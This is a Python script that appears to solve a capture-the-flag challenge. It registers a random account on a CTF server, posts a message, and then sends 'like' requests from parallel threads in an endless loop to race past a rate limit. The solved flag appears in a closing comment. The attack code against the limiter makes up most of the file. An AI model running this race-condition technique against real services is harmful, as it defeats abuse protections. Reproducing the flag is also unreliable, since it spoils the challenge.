import requests
import threading
from threading import Thread
import time
import random
import string
#from bs4 import BeautifulSoup

#URL="http://ratelimited.ctf.offdef.it/"
URL="http://ratelimited2.ctf.offdef.it/"

def login(session, username, password):
    target = URL + "login"
    r = session.post(target, data={'username': username, 'password': password, 'login': 'login'})
    return r

def register(session, username, password):
    target = URL + "login"
    r = session.post(target, data={'username': username, 'password': password, 'register': 'register'})
    return r

def like(session, messageID):
    target = URL + "like"
    r = session.post(target, data={'msg_id': messageID})
    if 'You got tons of likes:' in r.text:
        print(r.text)
    elif 'You are liking too fast!' in r.text:
        print(r.text)
    return r

def post(session, content):
    target = URL + "post"
    r = session.post(target, data={'content': content, 'img': id_generator()})
    return r

def id_generator(size=10, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for i in range(size))

s = requests.Session()
u = id_generator()
print(u)
p = id_generator()
print(u)
page = register(s, u, p)
print("Registered.")

page = login(s, u, p)
#print(page.text)
print("Logged in.")

page = post(s, "ciao")
print("Posted.")


def extract_n_words_after(text, username_by_, n):
    words = text.split()
    index = words.index(username_by_) if username_by_ in words else -1

    if index != -1:
        result_words = words[index + 1 : index + 1 + n]
        result_text = ' '.join(result_words)
        return result_text

import re

def getMessageID(text):
    # Define the regex pattern to find the number after 'value='
    pattern = re.compile(r'value="(\d+)"')

    # Search for the pattern in the text
    match = re.search(pattern, text)

    # If a match is found, print the number; otherwise, print an error message
    if match:
        number = match.group(1)
        return number

if (u in page.text):
    id = getMessageID(extract_n_words_after(page.text, u, 20))

print("MessageID: " + id)

while True:
    print("New try...")
    t1 = Thread(target=like, args=(s, id))
    t2 = Thread(target=like, args=(s, id))
    t3 = Thread(target=like, args=(s, id))
    t4 = Thread(target=like, args=(s, id))

    t1.start()
    t2.start()
    t3.start()
    t4.start()

    time.sleep(0.1)

#flag{You_like_your_post_very_much!}